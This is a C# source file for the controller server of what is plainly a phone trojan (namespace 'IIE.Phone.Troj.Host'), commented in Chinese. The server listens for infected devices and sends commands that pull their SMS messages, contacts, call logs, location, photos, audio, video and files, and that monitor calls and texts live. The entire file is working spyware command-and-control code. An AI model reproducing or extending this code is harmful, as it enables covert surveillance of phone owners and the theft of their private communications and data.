using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Windows.Forms;
using InOut;
using InOut.PacketImp;
using IIE.Phone.Troj.Host.Handler;
using System.Net.NetworkInformation;

namespace IIE.Phone.Troj.Host
{
    public class Server : IServer, IController
    {
        public ILog Log { get; private set; }
        public IMainView MainView { get; private set; }

        private readonly Socket serverSocket;
        private bool online = true;
        private string ConnectionIP;
        private int num;
        private string num1;
        private readonly int nclient;
        public Dictionary<string, ClientHandler> ClientMap { get; private set; }
        public Dictionary<string, ChannelDistributionHandler> ChannelHandlerMap { get; private set; }

        public Server(IConfig config, ILog log, IMainView mainView)
        {
            String ataid = "";
            ataid = get_ataid.GetHardDiskID();
            num = 0;
            Random rad = new Random();//实例化随机数产生器rad；
            num = rad.Next(10000, 20000);//用rad生成大于等于1000，小于等于9999的随机数；
            num1 = num.ToString(); 
            //MessageBox.Show(ataid);
            //if (ataid == "3CB0EA83")
            //{
            //if(ataid == "86AB20B7")
            //{
                Log = log;
                MainView = mainView;
                MainView.Server = this;
                nclient = 0;
                ClientMap = new Dictionary<string, ClientHandler>();
                ChannelHandlerMap = new Dictionary<string, ChannelDistributionHandler>();
                NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
                ConnectionIP = "";
                foreach (NetworkInterface adapter in nics)
                {
                    //判断是否为以太网卡
                    //Wireless80211         无线网卡    Ppp     宽带连接
                    //Ethernet              以太网卡   
                    //这里篇幅有限贴几个常用的，其他的返回值大家就自己百度吧！
                    if (adapter.NetworkInterfaceType == NetworkInterfaceType.Wireless80211)
                    {
                        //获取以太网卡网络接口信息
                        IPInterfaceProperties ip = adapter.GetIPProperties();
                        //获取单播地址集
                        UnicastIPAddressInformationCollection ipCollection = ip.UnicastAddresses;
                        foreach (UnicastIPAddressInformation ipadd in ipCollection)
                        {
                            //InterNetwork    IPV4地址      InterNetworkV6        IPV6地址
                            //Max            MAX 位址
                            if (ipadd.Address.AddressFamily == AddressFamily.InterNetwork)
                                //判断是否为ipv4
                                ConnectionIP = ipadd.Address.ToString();//获取ip
                        }
                    }
                }
                try
                {
                    //MessageBox.Show(ConnectionIP);
                    //MessageBox.Show(num1);
                    var ipEndPoint = new IPEndPoint(IPAddress.Parse(ConnectionIP), num);
                    serverSocket = new Socket(ipEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                    serverSocket.Bind(ipEndPoint);
                    serverSocket.Listen(10);
                }
                catch (Exception e)
                {
                    MessageBox.Show("监听端口已被占用！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    throw;
                }
            //}
           // else
           // {
           //     MessageBox.Show("该设备未激活，请激活后重新打开！");
           //     Log.LogTxt("该设备未激活，请激活后重新打开！");
           // }
        }
        
        public void SetOnlineAsyn()
        {
            new Task(SetOnline).Start();
        }

        public void SetOnline()
        {
            while (online)
            {
                if (ConnectionIP == null)
                {
                    Log.LogTxt("错误：当前服务器未连接无线网，请连接无线网后重新打开服务器端");

                }
                Log.LogTxt("当前服务器IP是" + ConnectionIP);
                Log.LogTxt("当前服务绑定的端口号是" + num1);
                Log.LogTxt("监听服务器已开启，等待客户端连接!");
                try
                {

                    Socket cs = serverSocket.Accept();

                    string id = nclient + "client";
                    var newCH = new ClientHandler(cs, id, this, Log, MainView);
                    ClientMap[id] = newCH;
                    ChannelHandlerMap[id] = new ChannelDistributionHandler();

                    newCH.Start();
                    Log.LogTxt("客户端已连接，连接ID为： " + id);

                }
                catch (Exception)
                {
                    Log.LogErrTxt("接收客户端连接时发生错误!");
                }
            }

            Log.LogTxt("*** 服务端已停止   ***\n");
        }

        public void SetOffline()
        {
            online = false;
        }

        public void Storage(TransportPacket p, String i)
        {
            int result;
            int chan = p.Channel;

            if (!ChannelHandlerMap.ContainsKey(i))
            {
                Log.LogTxt("错误: 未知客户端数据");
                return;
            }
            if (ChannelHandlerMap[i].GetPacketMap(chan) == null
                || ChannelHandlerMap[i].GetStorage(chan) == null)
            {

                Log.LogErrTxt("错误: 未知通信信道！");
                return;
            }

            result = ChannelHandlerMap[i].GetStorage(chan).AddPacket(p);

            if (result == Protocol.PacketLost)
            {
                Log.LogErrTxt("错误: 数据包丢失.");

            }
            else if (result == Protocol.NoMore)
            {
                Log.LogErrTxt("错误: the final packet has already been received (no more packets awaited)");

            }
            else if (result == Protocol.SizeError)
            {
                Log.LogErrTxt("错误: 数据包长度错误");
            }
            else if (result == Protocol.AllDone)
            {
                dataHandlerStarter(chan, i);
            }

        }

        public void dataHandlerStarter(int channel, String imei)
        {

            if (ChannelHandlerMap[imei].GetStorage(channel) == null
                    || ChannelHandlerMap[imei].GetPacketMap(channel) == null
                    || ChannelHandlerMap[imei].GetPacketHandlerMap(channel) == null)
            {
                Log.LogErrTxt("错误: a handler class cannot be found for the used channel " + channel);
                return;
            }

            byte[] finalData = ChannelHandlerMap[imei].GetStorage(channel)
                    .GetFinalData();



            IPacket p = ChannelHandlerMap[imei].GetPacketMap(channel);
            p.Parse(finalData);


            IPacketHandler handler = ChannelHandlerMap[imei].GetPacketHandlerMap(channel);

            //MessageBox.Show("5");
            handler.HandlePacket(p, imei, this);
        }

        public void CommandSender(string imei, short command, byte[] args)
        {
            int channel;
            ChannelDistributionHandler channelHandler;
            try
            {
                channelHandler = ChannelHandlerMap[imei];
                channel = channelHandler.GetFreeChannel();

            }
            catch (Exception)
            {
                Log.LogErrTxt("客户端已断开连接. 发送命令失败： " + command);
                return;
            }

            if (command == Protocol.GetGpsStream)
            {
                //if (!ChannelHandlerMap[imei].RegisterListener(channel, new GPSPacket()))
                //    log.LogErrTxt("错误: 通信信道 " + channel + " 已被注册！");
                //ChannelHandlerMap[imei].RegisterHandler(channel, new GPSHandler(channel, imei));
                //.saveMapChannel(imei, channel);

            }
            else if ((command == Protocol.GetAdvInformations))
            {
                if (!channelHandler.RegisterListener(channel, new AdvancedInformationPacket()))
                    Log.LogErrTxt("错误: 信道 " + channel + " 正在使用!");
                channelHandler.RegisterHandler(channel, new AdvInfoHandler(channel, imei, MainView));

            }
            else if ((command == Protocol.GetPreference))
            {
                if (!channelHandler.RegisterListener(channel, new PreferencePacket()))
                    Log.LogErrTxt("错误: channel " + channel + " is already in use!");
                channelHandler.RegisterHandler(channel, new PreferenceHandler(channel, imei, MainView));

            }
            else if ((command == Protocol.GetSoundStream))
            {
                if (!channelHandler.RegisterListener(channel, new RawPacket()))
                    Log.LogErrTxt("错误: channel " + channel + " is already in use!");
                channelHandler.RegisterHandler(channel, new SoundHandler(channel, imei, MainView));
                MainView.SaveSoundChannel(imei, channel);

            }
            else if ((command == Protocol.GetPicture))
            {
                if (!channelHandler.RegisterListener(channel, new RawPacket()))
                    Log.LogErrTxt("错误: channel " + channel + " is already in use!");
                channelHandler.RegisterHandler(channel, new PictureHandler(channel, imei, MainView));
                MainView.SavePictureChannel(imei, channel);

            }
            else if ((command == Protocol.ListDir))
            {
                if (!channelHandler.RegisterListener(channel, new FileTreePacket()))
                    Log.LogErrTxt("错误: channel " + channel + " is already in use!");
                channelHandler.RegisterHandler(channel, new FileTreeHandler(channel, imei, MainView));

            }
            else if ((command == Protocol.GetCallLogs))
            {
                if (!channelHandler.RegisterListener(channel, new CallLogPacket()))
                    Log.LogErrTxt("错误: channel " + channel + " is already in use!");
                channelHandler.RegisterHandler(channel, new CallLogHandler(channel, imei, MainView));
                MainView.SaveCallLogChannel(imei, channel);

            }
            else if ((command == Protocol.GetSms))
            {
                if (!channelHandler.RegisterListener(channel, new SMSTreePacket()))
                    Log.LogErrTxt("错误: channel " + channel + " is already in use!");
                channelHandler.RegisterHandler(channel, new SMSHandler(channel, imei, MainView));
                MainView.SaveSMSChannel(imei, channel);

            }
            else if ((command == Protocol.GetContacts))
            {
                if (!channelHandler.RegisterListener(channel, new ContactsPacket()))
                    Log.LogErrTxt("错误: channel " + channel + " is already in use!");
                channelHandler.RegisterHandler(channel, new ContactsHandler(channel, imei, MainView));
                MainView.SaveContactChannel(imei, channel);

            }
            else if ((command == Protocol.MonitorCall))
            {
                if (!channelHandler.RegisterListener(channel, new CallStatusPacket()))
                    Log.LogErrTxt("错误: channel " + channel + " is already in use!");
                channelHandler.RegisterHandler(channel, new CallMonitorHandler(channel, imei, MainView));
                MainView.SaveMonitorCallChannel(imei, channel);

            }
            else if ((command == Protocol.MonitorSms))
            {
                if (!channelHandler.RegisterListener(channel, new ShortSMSPacket()))
                    Log.LogErrTxt("错误: channel " + channel + " is already in use!");
                channelHandler.RegisterHandler(channel, new SMSMonitorHandler(channel, imei, MainView));
                MainView.SaveMonitorSMSChannel(imei, channel);

            }
            else if (command == Protocol.Connect)
            {
                channelHandler.RegisterListener(channel, new CommandPacket());
                channelHandler.RegisterListener(1, new LogPacket());
                channelHandler.RegisterHandler(1, new ClientLogHandler(channel, imei, MainView));
            }
            else if ((command == Protocol.GetVideoStream))
            {
                if (!channelHandler.RegisterListener(channel, new RawPacket()))
                    Log.LogErrTxt("错误: channel " + channel + " is already in use!");
                channelHandler.RegisterHandler(channel, new VideoHandler(channel, imei, MainView));
                MainView.SaveVideoChannel(imei, channel);
            }
             

            var nullArgs = new byte[0];
            if (args == null)
                args = nullArgs;
            ClientMap[imei].ToMux(command, channel, args);
            if (command == Protocol.Disconnect)
            {
                ClientMap.Remove(imei);
                ChannelHandlerMap[imei].RemoveListener(1);
                ChannelHandlerMap.Remove(imei);
            }
        }

        public void CommandFileSender(string imei, short command, byte[] args, string dir, string name)
        {
            var channelHander = ChannelHandlerMap[imei];
            int channel = channelHander.GetFreeChannel();

            if (!channelHander.RegisterListener(channel, new FilePacket()))
                Log.LogErrTxt("错误: channel " + channel + " is already in use!");

            channelHander.RegisterHandler(channel, new FileHandler(channel, imei, MainView, dir, name));


            byte[] nullArgs = new byte[0];
            if (args == null) args = nullArgs;
            ClientMap[imei].ToMux(command, channel, args);
        }

        public void CommandStopSender(String imei, short command, byte[] args,int channel)
        {

            ChannelHandlerMap[imei].RemoveListener(channel);

            byte[] nullArgs = new byte[0];
            if (args == null)
                args = nullArgs;
            ClientMap[imei].ToMux(command, channel, args);
        }

        public void DeleteClientHandler(string i)
        {
            if (ClientMap.ContainsKey(i) && ChannelHandlerMap.ContainsKey(i))
            {
                ClientMap.Remove(i);
                ChannelHandlerMap.Remove(i);
                Log.LogTxt("客户端 " + i + " 断开连接！");

            }
            else
                Log.LogErrTxt(i + "在断开连接前客户端不能被删除!");
        }

        public void Realse()
        {
            if (serverSocket != null)
                serverSocket.Close();
                serverSocket.Dispose();
                GC.Collect();
        }

    }
}
